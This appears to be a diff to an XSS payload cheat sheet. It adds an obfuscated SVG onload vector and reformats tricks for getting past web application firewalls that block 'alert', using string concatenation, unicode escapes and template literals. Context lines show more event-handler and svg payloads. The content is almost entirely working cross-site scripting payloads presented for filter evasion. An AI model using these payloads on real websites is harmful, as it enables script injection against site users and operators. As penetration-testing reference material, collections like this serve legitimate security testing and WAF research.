@@ -1,4 +1,4 @@
-
+"><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``^1//
 ">-setTimeout`\u0028alert(1)\u0029`-'
 <a"/onclick=(confirm)()>Click Here!
 <svg onload=prompt%26%230000000040document.domain)>
@@ -37,10 +37,7 @@ Use this tricks to bypass ``alert`` block by XSS WAF
 
   
 
-• (function(x){this[x+``ert``](1)})``al``
-
-• window[``al``+/e/[``ex``+``ec``]``e``+``rt``](2)
-
-• document['default'+'View'][``\u0061lert``](3)
-
-• this.ownerDocument.defaultView['\u0061lert'](
+(function(x){this[x+``ert``](1)})``al``
+window[``al``+/e/[``ex``+``ec``]``e``+``rt``](2)
+document['default'+'View'][``\u0061lert``](3)
+this.ownerDocument.defaultView['\u0061lert'](
